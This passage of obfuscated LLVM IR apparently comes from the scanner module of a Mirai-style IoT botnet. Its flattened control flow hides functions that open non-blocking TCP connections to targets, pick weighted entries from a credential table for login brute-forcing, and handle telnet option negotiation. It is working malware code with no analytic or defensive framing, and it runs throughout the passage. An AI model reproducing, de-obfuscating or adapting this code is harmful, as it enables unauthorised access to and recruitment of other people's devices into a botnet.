; <label>:2873:                                   ; preds = %loopEntry
  %2874 = load i8, i8* %2, align 1
  %2875 = zext i8 %2874 to i32
  %2876 = icmp eq i32 %2875, 78
  %2877 = select i1 %2876, i32 1541796805, i32 -809345522
  store i32 %2877, i32* %switchVar
  br label %loopEnd

; <label>:2878:                                   ; preds = %loopEntry
  %2879 = load i8, i8* %3, align 1
  %2880 = zext i8 %2879 to i32
  %2881 = icmp eq i32 %2880, 46
  %2882 = select i1 %2881, i32 1839754081, i32 -809345522
  store i32 %2882, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2883:                                   ; preds = %loopEntry
  %2884 = load i8, i8* %2, align 1
  %2885 = zext i8 %2884 to i32
  %2886 = icmp eq i32 %2885, 224
  store i32 1839754081, i32* %switchVar
  store i1 %2886, i1* %.reg2mem
  br label %loopEnd

; <label>:2887:                                   ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %2888 = select i1 %.reload, i32 915728304, i32 1358318879
  store i32 %2888, i32* %switchVar
  br label %loopEnd

; <label>:2889:                                   ; preds = %loopEntry
  %2890 = load i8, i8* %2, align 1
  %2891 = zext i8 %2890 to i32
  %2892 = shl i32 %2891, 24
  %2893 = load i8, i8* %3, align 1
  %2894 = zext i8 %2893 to i32
  %2895 = shl i32 %2894, 16
  %2896 = or i32 %2892, %2895
  %2897 = load i8, i8* %4, align 1
  %2898 = zext i8 %2897 to i32
  %2899 = shl i32 %2898, 8
  %2900 = or i32 %2896, %2899
  %2901 = load i8, i8* %5, align 1
  %2902 = zext i8 %2901 to i32
  %2903 = shl i32 %2902, 0
  %2904 = or i32 %2900, %2903
  %2905 = call i32 @htonl(i32 %2904) #7
  ret i32 %2905

loopEnd:                                          ; preds = %2887, %2883, %2878, %2873, %2868, %2863, %2858, %2853, %2848, %2843, %2838, %2833, %2828, %2823, %2818, %2813, %2808, %2803, %2798, %2793, %2788, %2783, %2778, %2773, %2768, %2763, %2758, %2753, %2748, %2743, %2738, %2733, %2728, %2723, %2718, %2713, %2708, %2703, %2698, %2693, %2688, %2683, %2678, %2673, %2668, %2663, %2658, %2653, %2648, %2643, %2638, %2633, %2628, %2623, %2618, %2613, %2608, %2603, %2598, %2593, %2588, %2583, %2578, %2573, %2568, %2563, %2558, %2553, %2548, %2543, %2538, %2533, %2528, %2523, %2518, %2513, %2508, %2503, %2498, %2493, %2488, %2483, %2478, %2473, %2468, %2463, %2458, %2453, %2448, %2443, %2438, %2433, %2428, %2423, %2418, %2413, %2408, %2403, %2398, %2393, %2388, %2383, %2378, %2373, %2368, %2363, %2358, %2353, %2348, %2343, %2338, %2333, %2328, %2323, %2318, %2313, %2308, %2303, %2298, %2293, %2288, %2283, %2278, %2273, %2268, %2263, %2258, %2253, %2248, %2243, %2238, %2233, %2228, %2223, %2218, %2213, %2208, %2203, %2198, %2193, %2188, %2183, %2178, %2173, %2168, %2163, %2158, %2153, %2148, %2143, %2138, %2133, %2128, %2123, %2118, %2113, %2108, %2103, %2098, %2093, %2088, %2083, %2078, %2073, %2068, %2063, %2058, %2053, %2048, %2043, %2038, %2033, %2028, %2023, %2018, %2013, %2008, %2003, %1998, %1993, %1988, %1983, %1978, %1973, %1968, %1963, %1958, %1953, %1948, %1943, %1938, %1933, %1928, %1923, %1918, %1913, %1908, %1903, %1898, %1893, %1888, %1883, %1878, %1873, %1868, %1863, %1858, %1853, %1848, %1843, %1838, %1833, %1828, %1823, %1818, %1813, %1808, %1803, %1798, %1793, %1788, %1783, %1778, %1773, %1768, %1763, %1758, %1753, %1748, %1743, %1738, %1733, %1728, %1723, %1718, %1713, %1708, %1703, %1698, %1693, %1688, %1683, %1678, %1673, %1668, %1663, %1658, %1653, %1648, %1643, %1638, %1633, %1628, %1623, %1618, %1613, %1608, %1603, %1598, %1593, %1588, %1583, %1578, %1573, %1568, %1563, %1558, %1553, %1548, %1543, %1538, %1533, %1528, %1523, %1518, %1513, %1508, %1503, %1498, %1493, %1488, %1483, %1478, %1473, %1468, %1463, %1458, %1453, %1448, %1443, %1438, %1433, %1428, %1423, %1418, %1413, %1408, %1403, %1398, %1393, %1388, %1383, %1378, %1373, %1368, %1363, %1358, %1353, %1348, %1343, %1338, %1333, %1328, %1323, %1318, %1313, %1308, %1303, %1298, %1293, %1288, %1283, %1278, %1273, %1268, %1263, %1258, %1253, %1248, %1243, %1238, %1233, %1228, %1223, %1218, %1213, %1208, %1203, %1198, %1193, %1188, %1183, %1178, %1173, %1168, %1163, %1158, %1153, %1148, %1143, %1138, %1133, %1128, %1123, %1118, %1113, %1108, %1103, %1098, %1093, %1088, %1083, %1078, %1073, %1068, %1063, %1058, %1053, %1048, %1043, %1038, %1033, %1028, %1023, %1018, %1013, %1008, %1003, %998, %993, %988, %983, %978, %973, %968, %963, %958, %953, %948, %943, %938, %933, %928, %923, %918, %913, %908, %903, %898, %893, %888, %883, %878, %873, %868, %863, %858, %853, %848, %843, %838, %833, %828, %823, %818, %813, %808, %803, %798, %793, %788, %783, %778, %773, %768, %763, %758, %753, %748, %743, %738, %733, %728, %723, %718, %713, %708, %703, %698, %693, %688, %683, %678, %673, %668, %663, %658, %653, %648, %643, %638, %633, %628, %623, %618, %613, %608, %603, %598, %593, %588, %583, %578, %573, %568, %563, %558, %553, %548, %543, %538, %533, %528, %523, %518, %513, %508, %503, %498, %493, %488, %483, %478, %473, %468, %463, %458, %453, %448, %443, %438, %433, %428, %423, %418, %413, %408, %403, %398, %393, %388, %383, %378, %373, %368, %363, %358, %353, %348, %343, %338, %333, %328, %323, %318, %313, %308, %303, %298, %293, %288, %283, %278, %273, %268, %263, %258, %253, %248, %243, %238, %233, %228, %223, %218, %213, %208, %203, %198, %193, %188, %183, %178, %173, %168, %163, %158, %153, %148, %143, %138, %133, %128, %123, %118, %113, %108, %103, %98, %93, %88, %83, %78, %73, %68, %63, %58, %53, %48, %43, %38, %33, %28, %23, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal void @setup_connection(%struct.scanner_connection*) #0 {
  %.reg2mem = alloca i32
  %2 = alloca %struct.scanner_connection*, align 8
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %2, align 8
  %5 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %5, i8 0, i64 16, i32 4, i1 false)
  %6 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %7 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %6, i32 0, i32 1
  %8 = load i32, i32* %7, align 8
  store i32 %8, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1237082354, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1237082354, label %first
    i32 1887930453, label %11
    i32 835121300, label %16
    i32 -823342689, label %22
    i32 1556807011, label %23
    i32 1084763272, label %61
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %9 = icmp ne i32 %.reload, -1
  %10 = select i1 %9, i32 1887930453, i32 835121300
  store i32 %10, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %13 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %12, i32 0, i32 1
  %14 = load i32, i32* %13, align 8
  %15 = call i32 @close(i32 %14)
  store i32 835121300, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = call i32 @socket(i32 2, i32 1, i32 0) #6
  %18 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %19 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i32 0, i32 1
  store i32 %17, i32* %19, align 8
  %20 = icmp eq i32 %17, -1
  %21 = select i1 %20, i32 -823342689, i32 1556807011
  store i32 %21, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  store i32 1084763272, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %25 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %24, i32 0, i32 6
  store i32 0, i32* %25, align 4
  %26 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %27 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %26, i32 0, i32 7
  %28 = getelementptr inbounds [256 x i8], [256 x i8]* %27, i32 0, i32 0
  call void @util_zero(i8* %28, i32 256)
  %29 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %30 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %29, i32 0, i32 1
  %31 = load i32, i32* %30, align 8
  %32 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %33 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %32, i32 0, i32 1
  %34 = load i32, i32* %33, align 8
  %35 = call i32 (i32, i32, ...) @fcntl(i32 %34, i32 3, i32 0)
  %36 = or i32 2048, %35
  %37 = call i32 (i32, i32, ...) @fcntl(i32 %31, i32 4, i32 %36)
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %38, align 4
  %39 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %40 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %39, i32 0, i32 4
  %41 = load i32, i32* %40, align 4
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %43 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %42, i32 0, i32 0
  store i32 %41, i32* %43, align 4
  %44 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %45 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %44, i32 0, i32 5
  %46 = load i16, i16* %45, align 8
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %46, i16* %47, align 2
  %48 = load i32, i32* @fake_time, align 4
  %49 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %50 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %49, i32 0, i32 2
  store i32 %48, i32* %50, align 4
  %51 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %52 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %51, i32 0, i32 3
  store i32 1, i32* %52, align 8
  %53 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %54 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %53, i32 0, i32 1
  %55 = load i32, i32* %54, align 8
  %56 = bitcast %union.__CONST_SOCKADDR_ARG* %4 to %struct.sockaddr**
  %57 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %57, %struct.sockaddr** %56, align 8
  %58 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %4, i32 0, i32 0
  %59 = load %struct.sockaddr*, %struct.sockaddr** %58, align 8
  %60 = call i32 @connect(i32 %55, %struct.sockaddr* %59, i32 16)
  store i32 1084763272, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %23, %22, %16, %11, %first, %switchDefault
  br label %loopEntry
}

declare i32 @select(i32, %struct.fd_set.26*, %struct.fd_set.26*, %struct.fd_set.26*, %struct.timeval.27*) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

; Function Attrs: noinline nounwind uwtable
define internal %struct.scanner_auth* @random_auth_entry() #0 {
  %1 = alloca %struct.scanner_auth*, align 8
  %2 = alloca i32, align 4
  %3 = alloca i16, align 2
  %4 = call i32 @rand_next()
  %5 = load i16, i16* @auth_table_max_weight, align 2
  %6 = zext i16 %5 to i32
  %7 = urem i32 %4, %6
  %8 = trunc i32 %7 to i16
  store i16 %8, i16* %3, align 2
  store i32 0, i32* %2, align 4
  %switchVar = alloca i32
  store i32 -711842142, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -711842142, label %9
    i32 1248896283, label %14
    i32 -377847914, label %26
    i32 628028139, label %27
    i32 -34173757, label %39
    i32 171951659, label %44
    i32 1439372644, label %45
    i32 -289008483, label %46
    i32 1511411808, label %49
    i32 1539216115, label %50
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %2, align 4
  %11 = load i32, i32* @auth_table_len, align 4
  %12 = icmp slt i32 %10, %11
  %13 = select i1 %12, i32 1248896283, i32 1511411808
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i16, i16* %3, align 2
  %16 = zext i16 %15 to i32
  %17 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %18 = load i32, i32* %2, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %17, i64 %19
  %21 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %20, i32 0, i32 2
  %22 = load i16, i16* %21, align 8
  %23 = zext i16 %22 to i32
  %24 = icmp slt i32 %16, %23
  %25 = select i1 %24, i32 -377847914, i32 628028139
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  store i32 -289008483, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i16, i16* %3, align 2
  %29 = zext i16 %28 to i32
  %30 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %31 = load i32, i32* %2, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %30, i64 %32
  %34 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %33, i32 0, i32 3
  %35 = load i16, i16* %34, align 2
  %36 = zext i16 %35 to i32
  %37 = icmp slt i32 %29, %36
  %38 = select i1 %37, i32 -34173757, i32 171951659
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %41 = load i32, i32* %2, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %40, i64 %42
  store %struct.scanner_auth* %43, %struct.scanner_auth** %1, align 8
  store i32 1539216115, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 1439372644, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  store i32 -289008483, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i32, i32* %2, align 4
  %48 = add nsw i32 %47, 1
  store i32 %48, i32* %2, align 4
  store i32 -711842142, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  store %struct.scanner_auth* null, %struct.scanner_auth** %1, align 8
  store i32 1539216115, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load %struct.scanner_auth*, %struct.scanner_auth** %1, align 8
  ret %struct.scanner_auth* %51

loopEnd:                                          ; preds = %49, %46, %45, %44, %39, %27, %26, %14, %9, %switchDefault
  br label %loopEntry
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define i32 @recv_strip_null(i32, i8*, i32, i32) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  %11 = load i32, i32* %5, align 4
  %12 = load i8*, i8** %6, align 8
  %13 = load i32, i32* %7, align 4
  %14 = sext i32 %13 to i64
  %15 = load i32, i32* %8, align 4
  %16 = call i64 @recv(i32 %11, i8* %12, i64 %14, i32 %15)
  %17 = trunc i64 %16 to i32
  store i32 %17, i32* %9, align 4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1617093681, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1617093681, label %first
    i32 -976112894, label %21
    i32 -2085206367, label %22
    i32 -42617377, label %27
    i32 -1161450302, label %36
    i32 1614936715, label %41
    i32 436254624, label %42
    i32 -213798874, label %45
    i32 -1242571673, label %46
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %19 = icmp sgt i32 %.reload, 0
  %20 = select i1 %19, i32 -976112894, i32 -1242571673
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  store i32 0, i32* %10, align 4
  store i32 0, i32* %10, align 4
  store i32 -2085206367, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  %23 = load i32, i32* %10, align 4
  %24 = load i32, i32* %9, align 4
  %25 = icmp slt i32 %23, %24
  %26 = select i1 %25, i32 -42617377, i32 -213798874
  store i32 %26, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i8*, i8** %6, align 8
  %29 = load i32, i32* %10, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = icmp eq i32 %33, 0
  %35 = select i1 %34, i32 -1161450302, i32 1614936715
  store i32 %35, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i8*, i8** %6, align 8
  %38 = load i32, i32* %10, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds i8, i8* %37, i64 %39
  store i8 65, i8* %40, align 1
  store i32 1614936715, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  store i32 436254624, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i32, i32* %10, align 4
  %44 = add nsw i32 %43, 1
  store i32 %44, i32* %10, align 4
  store i32 -2085206367, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  store i32 -1242571673, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i32, i32* %9, align 4
  ret i32 %47

loopEnd:                                          ; preds = %45, %42, %41, %36, %27, %22, %21, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_iacs(%struct.scanner_connection*) #0 {
  %2 = alloca %struct.scanner_connection*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca [3 x i8], align 1
  %7 = alloca [9 x i8], align 1
  store %struct.scanner_connection* %0, %struct.scanner_connection** %2, align 8
  store i32 0, i32* %3, align 4
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i32 0, i32 0
  store i8* %10, i8** %4, align 8
  %switchVar = alloca i32
  store i32 355256417, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 355256417, label %11
    i32 -1610100515, label %18
    i32 1348491378, label %24
    i32 -1491703041, label %25
    i32 535647334, label %31
    i32 549611720, label %37
    i32 -1770095226, label %38
    i32 -871954520, label %45
    i32 -1931401950, label %50
    i32 1943428591, label %57
    i32 -142992811, label %65
    i32 -2113726882, label %66
    i32 1901499252, label %73
    i32 -1145222664, label %74
    i32 1190212686, label %89
    i32 1131293602, label %90
    i32 202551522, label %96
    i32 393363301, label %97
    i32 717872427, label %98
    i32 -1220040180, label %102
    i32 81931004, label %111
    i32 669723522, label %116
    i32 -870485496, label %125
    i32 2111839155, label %130
    i32 269152854, label %131
    i32 2057052140, label %132
    i32 132083034, label %135
    i32 -1792275393, label %145
    i32 1901317870, label %146
    i32 -1149806517, label %147
    i32 1540592698, label %148
    i32 -653737587, label %149
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %3, align 4
  %13 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %14 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %13, i32 0, i32 6
  %15 = load i32, i32* %14, align 4
  %16 = icmp slt i32 %12, %15
  %17 = select i1 %16, i32 -1610100515, i32 -653737587
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %4, align 8
  %20 = load i8, i8* %19, align 1
  %21 = zext i8 %20 to i32
  %22 = icmp ne i32 %21, 255
  %23 = select i1 %22, i32 1348491378, i32 -1491703041
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  store i32 -653737587, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load i8*, i8** %4, align 8
  %27 = load i8, i8* %26, align 1
  %28 = zext i8 %27 to i32
  %29 = icmp eq i32 %28, 255
  %30 = select i1 %29, i32 535647334, i32 -1149806517
  store i32 %30, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %33 = load i8*, i8** %4, align 8
  %34 = call signext i8 @can_consume(%struct.scanner_connection* %32, i8* %33, i32 1)
  %35 = icmp ne i8 %34, 0
  %36 = select i1 %35, i32 -1770095226, i32 549611720
  store i32 %36, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  store i32 -653737587, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load i8*, i8** %4, align 8
  %40 = getelementptr inbounds i8, i8* %39, i64 1
  %41 = load i8, i8* %40, align 1
  %42 = zext i8 %41 to i32
  %43 = icmp eq i32 %42, 255
  %44 = select i1 %43, i32 -871954520, i32 -1931401950
  store i32 %44, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i8*, i8** %4, align 8
  %47 = getelementptr inbounds i8, i8* %46, i64 2
  store i8* %47, i8** %4, align 8
  %48 = load i32, i32* %3, align 4
  %49 = add nsw i32 %48, 2
  store i32 %49, i32* %3, align 4
  store i32 355256417, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %4, align 8
  %52 = getelementptr inbounds i8, i8* %51, i64 1
  %53 = load i8, i8* %52, align 1
  %54 = zext i8 %53 to i32
  %55 = icmp eq i32 %54, 253
  %56 = select i1 %55, i32 1943428591, i32 1190212686
  store i32 %56, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = bitcast [3 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %58, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @consume_iacs.tmp1, i32 0, i32 0), i64 3, i32 1, i1 false)
  %59 = bitcast [9 x i8]* %7 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %59, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @consume_iacs.tmp2, i32 0, i32 0), i64 9, i32 1, i1 false)
  %60 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %61 = load i8*, i8** %4, align 8
  %62 = call signext i8 @can_consume(%struct.scanner_connection* %60, i8* %61, i32 2)
  %63 = icmp ne i8 %62, 0
  %64 = select i1 %63, i32 -2113726882, i32 -142992811
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  store i32 -653737587, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i8*, i8** %4, align 8
  %68 = getelementptr inbounds i8, i8* %67, i64 2
  %69 = load i8, i8* %68, align 1
  %70 = zext i8 %69 to i32
  %71 = icmp ne i32 %70, 31
  %72 = select i1 %71, i32 1901499252, i32 -1145222664
  store i32 %72, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  store i32 1131293602, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  %75 = load i8*, i8** %4, align 8
  %76 = getelementptr inbounds i8, i8* %75, i64 3
  store i8* %76, i8** %4, align 8
  %77 = load i32, i32* %3, align 4
  %78 = add nsw i32 %77, 3
  store i32 %78, i32* %3, align 4
  %79 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %80 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %79, i32 0, i32 1
  %81 = load i32, i32* %80, align 8
  %82 = getelementptr inbounds [3 x i8], [3 x i8]* %6, i32 0, i32 0
  %83 = call i64 @send(i32 %81, i8* %82, i64 3, i32 16384)
  %84 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %85 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %84, i32 0, i32 1
  %86 = load i32, i32* %85, align 8
  %87 = getelementptr inbounds [9 x i8], [9 x i8]* %7, i32 0, i32 0
  %88 = call i64 @send(i32 %86, i8* %87, i64 9, i32 16384)
  store i32 -1792275393, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  store i32 1131293602, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %92 = load i8*, i8** %4, align 8
  %93 = call signext i8 @can_consume(%struct.scanner_connection* %91, i8* %92, i32 2)
  %94 = icmp ne i8 %93, 0
  %95 = select i1 %94, i32 393363301, i32 202551522
  store i32 %95, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  store i32 -653737587, i32* %switchVar
  br label %loopEnd

; <label>:97:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 717872427, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  %99 = load i32, i32* %5, align 4
  %100 = icmp slt i32 %99, 3
  %101 = select i1 %100, i32 -1220040180, i32 132083034
  store i32 %101, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  %103 = load i8*, i8** %4, align 8
  %104 = load i32, i32* %5, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8, i8* %103, i64 %105
  %107 = load i8, i8* %106, align 1
  %108 = zext i8 %107 to i32
  %109 = icmp eq i32 %108, 253
  %110 = select i1 %109, i32 81931004, i32 669723522
  store i32 %110, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i8*, i8** %4, align 8
  %113 = load i32, i32* %5, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds i8, i8* %112, i64 %114
  store i8 -4, i8* %115, align 1
  store i32 269152854, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  %117 = load i8*, i8** %4, align 8
  %118 = load i32, i32* %5, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds i8, i8* %117, i64 %119
  %121 = load i8, i8* %120, align 1
  %122 = zext i8 %121 to i32
  %123 = icmp eq i32 %122, 251
  %124 = select i1 %123, i32 -870485496, i32 2111839155
  store i32 %124, i32* %switchVar
  br label %loopEnd

; <label>:125:                                    ; preds = %loopEntry
  %126 = load i8*, i8** %4, align 8
  %127 = load i32, i32* %5, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds i8, i8* %126, i64 %128
  store i8 -3, i8* %129, align 1
  store i32 2111839155, i32* %switchVar
  br label %loopEnd

; <label>:130:                                    ; preds = %loopEntry
  store i32 269152854, i32* %switchVar
  br label %loopEnd

; <label>:131:                                    ; preds = %loopEntry
  store i32 2057052140, i32* %switchVar
  br label %loopEnd

; <label>:132:                                    ; preds = %loopEntry
  %133 = load i32, i32* %5, align 4
  %134 = add nsw i32 %133, 1
  store i32 %134, i32* %5, align 4
  store i32 717872427, i32* %switchVar
  br label %loopEnd

; <label>:135:                                    ; preds = %loopEntry
  %136 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %137 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %136, i32 0, i32 1
  %138 = load i32, i32* %137, align 8
  %139 = load i8*, i8** %4, align 8
  %140 = call i64 @send(i32 %138, i8* %139, i64 3, i32 16384)
  %141 = load i8*, i8** %4, align 8
  %142 = getelementptr inbounds i8, i8* %141, i64 3
